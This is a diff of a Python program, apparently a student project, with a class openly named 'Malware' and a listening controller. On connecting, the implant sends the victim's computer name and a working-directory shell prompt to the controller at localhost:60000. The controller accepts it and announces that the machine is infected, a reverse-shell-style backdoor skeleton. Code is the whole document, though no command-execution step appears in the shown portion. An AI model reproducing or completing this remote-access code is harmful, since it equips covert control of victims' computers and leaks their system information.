@@ -1,10 +1,7 @@
-import socket
-import os
-import sys
-import time
+import socket, os, sys, time
 
 """
-Classe contenant les fonctions communes entre client et serveur
+Classe contenant les variables communes entre client et serveur
 """
 
 
@@ -13,10 +10,7 @@ class Machine:
         self.server_addr = ("localhost", 60000)
         self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.language = "utf-8"
-        self.buffsize = 1024
-
-    def get_my_socket(self):
-        return self.my_socket
+        self.buffsize = 4096
 
 
 """
@@ -31,6 +25,7 @@ class Malware(Machine):
     def start(self):
         self.my_socket.connect(self.server_addr)
         self.send(os.environ["COMPUTERNAME"])
+        self.send(os.getcwd() + "> ")
 
     def send(self, message):
         self.my_socket.send(str(message).encode(self.language))
@@ -56,22 +51,25 @@ class Client(Machine):
         self.my_socket.bind(self.server_addr)
         self.my_socket.listen()
 
-    def send(self, distant_socket, commande):
+    def bind(self):
+        global distant_socket, addr, hostname
+        distant_socket, addr = self.my_socket.accept()
+        print("Connection accepted for :", addr)
+        hostname = distant_socket.recv(self.buffsize).decode(self.language)
+        print("The malware has infected the machine named " + str(hostname) + "\n")
+        self.receive()
+
+    def send(self, commande):
         distant_socket.send(commande.encode(self.language))
 
-    def receive(self, distant_socket):
+    def receive(self):
         rep = distant_socket.recv(self.buffsize)
         rep = rep.decode(self.language)
-        print(rep)
+        print(rep, end="")
 
-    def quit(self, distant_socket):
+    def quit(self):
         print("Shutting down in 3 seconds")
         time.sleep(3)
         distant_socket.close()
         self.my_socket.close()
         sys.exit()
-
-    def get_hostname(self, distant_socket):
-        hostname = distant_socket.recv(self.buffsize).decode(self.language)
-        print("The malware has infected the machine of : " + str(hostname))
-        return hostname
